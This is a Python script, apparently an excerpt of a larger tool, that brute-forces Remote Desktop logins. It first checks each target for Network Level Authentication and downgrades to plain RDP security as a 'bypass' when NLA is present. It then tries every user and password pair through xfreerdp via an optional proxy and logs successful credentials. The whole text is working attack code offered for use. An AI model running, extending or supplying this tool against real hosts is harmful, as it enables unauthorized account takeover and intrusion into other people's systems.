# brute.py
import subprocess
import random
import asyncio
from datetime import datetime

async def get_sec_mode(ip, proxy_cmd, auto_nla):
    if not auto_nla:
        return "/sec:nla"  # حالت معمولی
    try:
        cmd = f"{proxy_cmd} xfreerdp /u:test /p:test /v:{ip} /sec:nla /timeout:5 2>&1"
        result = subprocess.run(cmd, shell=True, timeout=8, capture_output=True, text=True)
        if "NLA" in result.stderr or result.returncode != 0:
            print(f"  → NLA Active on {ip} → Using bypass (/sec:rdp)")
            return "/sec:rdp"
        else:
            print(f"  → NLA Inactive on {ip} → Direct access")
            return "/sec:nla"
    except:
        return "/sec:rdp"  # اگر چک نشد، بایپس بزن

async def brute_rdp(ip, sem, users, passwords, proxy_cmd, auto_nla, results_file, stats, lock):
    async with sem:
        sec_mode = await get_sec_mode(ip, proxy_cmd, auto_nla)
        for user in users:
            for pwd in passwords:
                try:
                    cmd = f"{proxy_cmd} xfreerdp /u:{user} /p:\"{pwd}\" /v:{ip} {sec_mode} /no-consent /timeout:5 > /dev/null 2>&1"
                    result = subprocess.run(cmd, shell=True, timeout=TIMEOUT, capture_output=True)
                    if result.returncode == 0:
                        line = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')},{ip},{user},{pwd},{sec_mode}"
                        await save_line(results_file, line)
                        print(f"\n\033[91m[SUCCESS] {ip} | User: {user} | Pass: {pwd} | Mode: {sec_mode}\033[0m")
                        async with lock:
                            stats["success"] += 1
                        return
                except:
                    pass
        async with lock:
            stats["scanned"] += 1